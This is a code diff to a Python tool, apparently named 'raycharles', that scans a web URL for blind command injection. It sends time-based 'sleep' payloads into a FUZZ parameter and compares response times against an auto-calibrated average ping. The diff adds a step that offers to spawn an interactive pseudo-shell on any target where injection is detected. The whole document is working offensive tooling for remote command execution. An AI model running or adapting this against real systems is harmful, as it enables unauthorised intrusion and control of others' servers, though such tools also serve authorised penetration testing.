@@ -1,12 +1,11 @@
 import httpx
 import time
 
-from raycharles.utils import detect_parameters
+from raycharles.shell import spawn_shell
+from raycharles.utils import detect_parameters, detect_avg_ping
 from raycharles.payloads import build_payloads
 
 from argparse import ArgumentParser
-
-from rich.progress import Progress
 from rich.console import Console
 
 
@@ -91,19 +90,25 @@ def main() -> int:
         console.log("No parameter found.")
         return 1
 
-    if splitted_url.count("FUZZ") > 1:
-        console.log("Too much parameters found.")
-        return 1
-
     sleep_time = 5
 
     console.log(f"Using sleep time: {sleep_time}")
 
-    payloads = build_payloads(f"sleep {sleep_time}")
-    targets = []
+    session = httpx.Client(
+        headers={"User-Agent": user_agent},
+        timeout=timeout,
+    )
 
-    for payload in payloads:
+    console.log(f"Sending {ac_requests_number} requests for auto-calibration...")
+
+    average_ping = detect_avg_ping(session, url, ac_requests_number)
+
+    console.log(f"Found average ping: ~ {round(average_ping, 2)}")
+
+    for payload_func in build_payloads():
         final_url = ""
+
+        payload = payload_func(f"sleep {sleep_time}")
 
         for part in splitted_url:
             if part == "FUZZ":
@@ -113,44 +118,26 @@ def main() -> int:
 
         if arguments.show_urls:
             print(final_url)
+            continue
 
-        targets.append((final_url, payload))
-
-    if arguments.show_urls:
-        exit()
-
-    session = httpx.Client(
-        headers={"User-Agent": user_agent},
-        timeout=timeout,
-    )
-
-    console.log(f"Sending {ac_requests_number} requests for auto-calibration...")
-
-    times = []
-
-    for _ in range(ac_requests_number):
         start_time = time.time()
-        session.get(url)
-        times.append(time.time() - start_time)
+        session.get(final_url)
+        total_time = time.time() - start_time
 
-    average_ping = sum(times) / len(times)
+        if sleep_time - average_ping <= total_time:
+            console.log(
+                f"Found potential injection with payload: [red]{payload}[/] (~ {round(total_time - average_ping, 2)})"
+            )
 
-    console.log(f"Found average ping: ~ {round(average_ping, 2)}")
+            user_input = (
+                console.input("Wanna spawn a pseudo-shell? [Y/n] ") or "Y"
+            ).lower()
 
-    with Progress() as progress:
-        task = progress.add_task("Trying payloads", total=len(targets))
+            if user_input == "n":
+                continue
 
-        for url, payload in targets:
-            start_time = time.time()
-            session.get(url)
-            total_time = time.time() - start_time
-
-            if sleep_time - average_ping <= total_time:
-                progress.log(
-                    f"Found potential injection with payload: [red]{payload}[/] (~ {round(total_time - average_ping, 2)})"
-                )
-
-            progress.advance(task)
+            spawn_shell(console, session, url, payload_func)
+            return 0
 
     return 0
 
